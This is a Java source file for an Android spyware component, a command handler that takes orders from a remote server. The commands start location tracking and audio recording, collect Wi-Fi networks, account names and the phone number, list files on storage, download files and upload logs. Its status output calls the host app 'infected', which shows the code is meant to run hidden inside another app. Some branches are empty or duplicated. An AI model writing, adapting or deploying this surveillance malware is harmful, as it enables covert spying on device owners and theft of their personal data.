package com.safe.myapp;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import java.io.File;
import java.util.List;

/**
 * Created by stofstik on 4-2-15.
 */
public class SafeCommands {

    private Context context;
    private SafeAudio audio;
    private SafeCommunications comms;
    private SafeLogger logger;
    private SafeLocations locs;
    private String simpleId;

    private static final String[] COMMANDS = {"respond", "location start", "location stop",
            "audio start", "audio record", "audio stop", "toast ", "dialog ", "wifi",
            "accounts", "phone number", "ls ", "download ", "commands", "version", "app", "address",
            "timeout ", "status", "getlog", "ftp start", "ftp stop"};


    public SafeCommands(Context context, SafeCommunications comms, SafeLogger logger,
                        SafeLocations locs, SafeAudio audio, String simpleId) {
        this.context = context;
        this.comms = comms;
        this.logger = logger;
        this.locs = locs;
        this.audio = audio;
        this.simpleId = simpleId;
    }

    // handle messages
    public void messageHandler(String fromServer) {
        logger.write(fromServer);
        if (fromServer.equalsIgnoreCase(COMMANDS[0])) {
            comms.say("Responding");
        } else if (fromServer.equalsIgnoreCase(COMMANDS[1])) {
            locs.startLocations();
        } else if (fromServer.equalsIgnoreCase(COMMANDS[2])) {
            locs.stopLocations();
        } else if (fromServer.equalsIgnoreCase(COMMANDS[3]) ||
                fromServer.equalsIgnoreCase(COMMANDS[4])) {
            audio.startRecording();
        } else if (fromServer.equalsIgnoreCase(COMMANDS[5])) {
            audio.stopRecording();
        } else if (fromServer.startsWith(COMMANDS[6])) {
            toast(fromServer);
        } else if (fromServer.startsWith(COMMANDS[7])) {
            dialog(fromServer);
        } else if (fromServer.startsWith(COMMANDS[8])) {
            getWiFiNetworks();
        } else if (fromServer.startsWith(COMMANDS[9])) {
            getAccounts();
        } else if (fromServer.startsWith(COMMANDS[10])) {
            getPhoneNumber();
        } else if (fromServer.startsWith(COMMANDS[11])) {
            listDir(fromServer.substring(COMMANDS[11].length(), fromServer.length()));
        } else if (fromServer.startsWith(COMMANDS[12])) {
            String[] args = fromServer.substring(COMMANDS[12].length(), fromServer.length()).split(" ");
            comms.download(args);
        } else if (fromServer.startsWith(COMMANDS[13])) {
            for (String command : COMMANDS) {
                comms.say(command);
            }
        } else if (fromServer.startsWith(COMMANDS[14])) {
            comms.say("Version: " + SafeService.VERSION);
        } else if (fromServer.startsWith(COMMANDS[15])) {
            comms.say("Injected in: " + context.getApplicationContext().getPackageName());
        } else if (fromServer.startsWith(COMMANDS[16])) {
            comms.say(locs.getLastKnownAddress());
        } else if (fromServer.startsWith(COMMANDS[17])) {
            SafeService.setSoTimeOut(fromServer.substring(COMMANDS[17].length(), fromServer.length()));
        } else if (fromServer.equalsIgnoreCase(COMMANDS[18])) {
            sayStatus();
        } else if (fromServer.equalsIgnoreCase(COMMANDS[18])) {
            comms.upload(logger.logfile());
        } else if (fromServer.equalsIgnoreCase(COMMANDS[19])) {
        } else if (fromServer.equalsIgnoreCase(COMMANDS[20])) {
        }
    }

    private void getWiFiNetworks() {
        WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
        comms.say("Connected to: " + wifiInfo.getSSID() + " " + wifiInfo.getBSSID() + " " + wifiInfo.getMacAddress());
        List<ScanResult> results = wifiMgr.getScanResults();
        for (ScanResult result : results) {
            comms.say(result.SSID + " " + result.BSSID + " " + result.level);
        }
    }

    private void getAccounts() {
        Account[] accounts = AccountManager.get(context).getAccounts();
        if (accounts.length > 0) {
            for (Account account : accounts) {
                comms.say(account.toString());
            }
        } else {
            comms.say("Couldn't find any accounts");
        }
    }

    private String getFirstAccount() {
        Account[] accounts = AccountManager.get(context).getAccounts();
        if (accounts.length > 0) {
            return accounts[0].name;
        } else {
            return "null";
        }
    }

    private void getPhoneNumber() {
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        comms.say("" + tMgr.getLine1Number());
    }

    private void getScreenShot(){

    }

    // use AsyncTask to give some work out of hands to run toast on UI thread
    private void toast(String message) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String[] params) {
                String str = params[0];
                return str.substring(6, str.length());
            }

            @Override
            protected void onPostExecute(String message) {
                Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
            }
        }.execute(message);
    }

    private void dialog(String message) {
        Intent i = new Intent(context, SafeDialog.class);
        i.putExtra("message", message.substring(7, message.length()));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(i);
        /*new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String[] params) {
                String str = params[0];
                return str.substring(7, str.length());
            }

            @Override
            protected void onPostExecute(String message) {
                AlertDialog.Builder builder = new AlertDialog.Builder(context.getApplicationContext());
                builder.setMessage(message)
                        .setTitle("");
                AlertDialog dialog = builder.create();
                dialog.show();
            }
        }.execute(message);*/
    }

    private void listDir(String dir) {
        if (dir.equals("")) {
            comms.say("usage \"ls /\"");
        }
        try {
            File directory = new File(Environment.getExternalStorageDirectory(), dir);
            File[] listOfFiles = directory.listFiles();
            for (File file : listOfFiles) {
                comms.say(file.getName());
            }
        } catch (NullPointerException e) {
            comms.say("w00ps");
        }
    }

    private void sayStatus() {
        WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
        String ssid = wifiInfo.getSSID();
        if (ssid.equals("<unknown ssid>")) {
            ssid += " probably on mobile data";
        } else {
            ssid += " state " + wifiInfo.getSupplicantState();
        }
        comms.say("########################################################");
        comms.say("brand + model   = " + Build.BRAND + " " + Build.MODEL);
        comms.say("primary account = " + getFirstAccount());
        comms.say("wifi status     = " + ssid);
        comms.say("recording audio = " + SafeService.isbAudioStarted());
        comms.say("location track  = " + SafeService.isbLocationStarted());
        comms.say("infected app    = " + context.getApplicationContext().getPackageName() + " v" + SafeService.VERSION);
        comms.say("########################################################");
    }

    private void crash(){

    }

}
